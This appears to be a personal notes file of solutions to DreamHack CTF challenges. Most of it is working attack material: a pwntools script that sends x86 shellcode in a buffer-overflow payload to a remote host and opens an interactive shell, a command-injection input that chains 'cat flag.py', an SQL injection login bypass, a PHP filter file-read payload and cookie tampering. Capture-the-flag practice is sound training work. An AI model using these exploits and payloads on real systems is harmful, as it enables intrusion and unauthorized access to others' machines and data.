# DreamHack CTF

## basic_exploit_000
- Solve Code
    ```python
    from pwn import *

    context.log_level = "error"

    shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"

    p = remote("host1.dreamhack.games",8363)

    text = p.recv(1024).decode()

    buf_addr = p32(int((text.split("=")[1].strip())[1:11],16))

    payload = shellcode+ b'a'*106 + buf_addr
        
    print(payload)
    p.sendline(payload)
    p.interactive()
    p.close()
        
    ```
## Command-Injection-1
- How to Connecting 
    ```text
    HOST : host1.dreamhack.games
    Port : 8247/tcp
    ```
- Solve
    ```text
    - Remove the tag on page source
    - input Command : 8.8.8.8" | cat flag.py #
    ```

## COOKIE
- Solve
    ```text
    id : guest
    pw : guest
    change the cookie value is 'admin'
    ```

## php-1
- Solve
    ```text
    1. using the burp suite
    2. Detected attack point link
    3. use php filter & burp suite repeater
    4. command is
    php:filter/convert.base64-encode/resource=/var/www/www/uploads/flag
    ```

## Simple SQLi
- Solve
    ```text
    userid : admin" -- password : admin "--
    ```

## Web-misconf-1
- Solve
    ```text
    The hint is in File
    1. cat defaults.ini |grep password
    2. password is admin
    3. admin id is admin
    4. login on grafada
    5. find Flag !
    ```